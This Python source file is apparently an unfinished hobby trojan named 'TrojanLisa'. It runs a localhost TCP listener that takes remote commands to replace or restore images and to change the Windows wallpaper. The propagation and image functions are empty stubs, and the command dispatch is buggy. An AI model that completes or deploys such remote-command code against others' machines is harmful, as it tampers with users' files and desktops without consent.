import os
import shutil
import socket
import ctypes

class TrojanLisa:
    def __init__(self):
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    """ Server that opens a TCP socket. """
    def host(self, ip_addr, port):
        self.serv.bind((ip_addr, port))
        self.serv.listen()
        while True:
            conn, addr = self.serv.accept()
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    resp = data.decode()
                    print(resp)
                    self.execute(resp)
                    message = "Message from server"
                    conn.send(message.encode())
                except:
                    break
            conn.close()
            print("Client disconnected")

    """ Steganographic propagation into images. """
    def propagate(self):
        pass

    """ Execute command passed from RAT interface. """
    def execute(self, command):
        if command == "1":
            print("Replacing images with Mona Lisa...")
            self.replace_images(os.curdir)
        if command == "2":
            print("Restoring original images...")
            self.restore_images(os.curdir)
        if command == "3":
            print("Changing background...")
            self.change_wallpaper()
        else:
            print("Invalid command.")

    def change_wallpaper(self):
        SPI_SETDESKWALLPAPER = 20
        WALLPAPER_PATH = "E:\\code\\projects\\trojan_lisa\\img\\mona_lisa.jpg"
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH , 0)

    """ Replace images within a specified directory and all its children """
    def replace_images(self, root_dir):
        pass

    """ Restore images to original state within a specified directory and all its children """
    def restore_images(self, root_dir):
        pass
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()
    trojan_lisa.host('127.0.0.1', 8080)
    trojan_lisa.replace_images(".")
    trojan_lisa.restore_images(".")
    trojan_lisa.change_wallpaper()